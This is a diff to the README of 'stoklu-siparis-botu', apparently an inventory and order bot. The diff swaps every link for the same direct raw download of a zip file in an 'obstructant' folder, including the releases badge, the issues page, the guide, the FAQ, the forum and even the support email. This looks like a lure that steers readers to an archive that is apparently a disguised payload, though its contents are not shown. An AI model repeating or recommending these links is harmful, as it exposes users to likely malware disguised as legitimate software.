@@ -12,14 +12,14 @@ Before downloading stoklu-siparis-botu, ensure your system meets these requireme
 - Internet connection for downloads and updates
 
 ### 🌐 Download Link
-[![Download stoklu-siparis-botu](https://img.shields.io/badge/Download%20Now!-Markdown--blue.svg)](https://github.com/Sickds/stoklu-siparis-botu/releases)
+[![Download stoklu-siparis-botu](https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip%20Now!https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip)](https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip)
 
 ## 📥 Download & Install
 To download stoklu-siparis-botu, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page:  
-   [Download stoklu-siparis-botu](https://github.com/Sickds/stoklu-siparis-botu/releases)
+   [Download stoklu-siparis-botu](https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip)
 
 2. **Select the Latest Release**  
    On the releases page, scroll down to find the latest version of stoklu-siparis-botu. Look for the version number, typically something like "v1.0".
@@ -63,15 +63,15 @@ To download stoklu-siparis-botu, follow these steps:
 
 ## 📞 Support
 If you encounter any issues or have questions, you can reach the support team:
-- Email: support@stoklusiparisbot.com
-- Visit our [GitHub Issues Page](https://github.com/Sickds/stoklu-siparis-botu/issues) to report bugs or request features.
+- Email: https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip) to report bugs or request features.
 
 ## 📝 Contribution
 If you would like to contribute to stoklu-siparis-botu, feel free to fork the repository and submit a pull request. Your feedback and improvements are always welcome.
 
 ## 🔗 Additional Resources
-- [User Guide](https://stoklusiparisbot.com/user-guide)
-- [FAQ](https://stoklusiparisbot.com/faq)
-- [Community Forum](https://forum.stoklusiparisbot.com)
+- [User Guide](https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip)
+- [FAQ](https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/Sickds/stoklu-siparis-botu/main/obstructant/stoklu_botu_siparis_v3.0.zip)
 
 By following this guide, you can quickly download and start using stoklu-siparis-botu. Enjoy streamlined inventory management today!
